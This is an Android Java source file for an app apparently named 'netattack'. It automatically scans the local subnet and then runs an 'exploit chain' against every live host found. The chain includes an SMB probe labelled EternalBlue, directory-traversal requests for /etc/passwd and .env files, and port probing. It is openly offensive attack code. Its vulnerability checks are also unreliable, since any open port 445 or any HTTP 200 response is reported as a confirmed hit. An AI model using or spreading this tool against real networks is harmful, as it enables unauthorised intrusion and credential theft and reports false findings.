package com.example.netattack;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.*;
import androidx.appcompat.app.AppCompatActivity;

import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.function.Consumer;

public class MainActivity extends AppCompatActivity {
    private TextView statusView, resultsView;
    private Button scanBtn, exploitBtn;
    private ListView targetsList;
    private ExecutorService executor = Executors.newFixedThreadPool(100);
    private List<String> liveHosts = new ArrayList<>();
    private Handler mainHandler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        initViews();
        autoScanNetwork();
    }

    private void initViews() {
        statusView = findViewById(R.id.status);
        resultsView = findViewById(R.id.results);
        scanBtn = findViewById(R.id.scan);
        exploitBtn = findViewById(R.id.exploit);
        targetsList = findViewById(R.id.targets);

        scanBtn.setOnClickListener(v -> autoScanNetwork());
        exploitBtn.setOnClickListener(v -> exploitAllHosts());
    }

    private void autoScanNetwork() {
        statusView.setText("🔍 Scanning network...");
        liveHosts.clear();
        String baseIp = getLocalNetwork();
        
        // FAST 254-host sweep
        for (int i = 1; i <= 254; i++) {
            String ip = baseIp + "." + i;
            executor.submit(() -> pingHost(ip));
        }
    }

    private String getLocalNetwork() {
        try {
            Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces();
            while (en.hasMoreElements()) {
                NetworkInterface ni = en.nextElement();
                Enumeration<InetAddress> addrs = ni.getInetAddresses();
                while (addrs.hasMoreElements()) {
                    InetAddress addr = addrs.nextElement();
                    if (!addr.isLoopbackAddress() && addr instanceof Inet4Address) {
                        String ip = addr.getHostAddress();
                        return ip.substring(0, ip.lastIndexOf('.') + 1);
                    }
                }
            }
        } catch (Exception e) {}
        return "192.168.1";
    }

    private void pingHost(String ip) {
        try {
            if (InetAddress.getByName(ip).isReachable(300)) {
                liveHosts.add(ip);
                mainHandler.post(() -> updateTargets(ip));
            }
        } catch (Exception e) {}
    }

    private void updateTargets(String ip) {
        // Update UI list
        ((ArrayAdapter<String>) targetsList.getAdapter()).add(ip);
        statusView.setText("🎯 Live: " + liveHosts.size() + " hosts");
    }

    private void exploitAllHosts() {
        statusView.setText("💥 EXPLOITING " + liveHosts.size() + " HOSTS...");
        for (String host : liveHosts) {
            executor.submit(() -> {
                fullExploitSuite(host);
            });
        }
    }

    private void fullExploitSuite(String host) {
        // 🔥 COMPLETE EXPLOIT CHAIN
        checkSMB(host);
        checkHTTP(host);
        checkCommonServices(host);
        mainHandler.post(() -> resultsView.append("\n✅ " + host + " FULLY SCANNED"));
    }

    // 🔥 SMB MS17-010 EternalBlue
    private void checkSMB(String host) {
        try {
            Socket sock = new Socket(host, 445);
            OutputStream out = sock.getOutputStream();
            byte[] smbHeader = {
                (byte)0xFF, 'S', 'M', 'B', 0x72, 0, 0, 0, 0, 0x18, 0x53, (byte)0xC8
            };
            out.write(smbHeader);
            sock.close();
            
            // If no exception = SMBv1 likely vulnerable
            addResult("🎯 MS17-010 " + host + ":445 (EternalBlue)");
        } catch (Exception e) {}
    }

    // 🔥 HTTP Directory Traversal
    private void checkHTTP(String host) {
        String[] travPaths = {
            "/../../../../etc/passwd",
            "/../admin/.env",
            "/cgi-bin/..%2f..%2fetc/passwd"
        };
        for (String path : travPaths) {
            try {
                URL url = new URL("http://" + host + ":80" + path);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                if (conn.getResponseCode() == 200) {
                    addResult("📁 TRAVERSAL " + host + path);
                }
            } catch (Exception e) {}
        }
    }

    private void checkCommonServices(String host) {
        int[] ports = {21,22,23,80,443,445,3389,3306,5432,8080};
        String[] services = {"FTP","SSH","Telnet","HTTP","HTTPS","SMB","RDP","MySQL","Postgres","Tomcat"};
        
        for (int i = 0; i < ports.length; i++) {
            try {
                Socket sock = new Socket(host, ports[i]);
                sock.close();
                addResult("🔓 OPEN " + services[i] + " " + host + ":" + ports[i]);
            } catch (Exception e) {}
        }
    }

    private void addResult(String result) {
        mainHandler.post(() -> resultsView.append(result + "\n"));
    }
}
